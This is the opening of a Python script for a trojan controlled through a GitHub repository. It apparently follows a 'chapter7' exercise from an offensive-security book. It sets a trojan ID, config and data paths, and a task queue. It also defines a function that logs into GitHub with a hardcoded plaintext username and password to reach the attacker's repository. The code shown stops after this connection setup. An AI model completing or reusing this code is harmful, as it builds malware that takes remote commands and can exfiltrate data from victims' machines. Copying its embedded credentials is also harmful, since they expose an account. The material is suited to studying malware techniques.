import json
import base64
import sys
import time
# import imp
import importlib
import random
import threading
import queue
import os

from github3 import login

trojan_id="abc"

trojan_config="%s.json" % trojan_id
data_path="data/%s/" % trojan_id
trojan_modules=[]
configured=False
task_queue=queue.Queue()

def connect_to_gitbub():
    gh=login(username='shujiakoko',password='shujiakoko44')
    repo=gh.repository("shujiakoko","chapter7")
    branch=repo.branch('master')

    return gh,repo,branch
    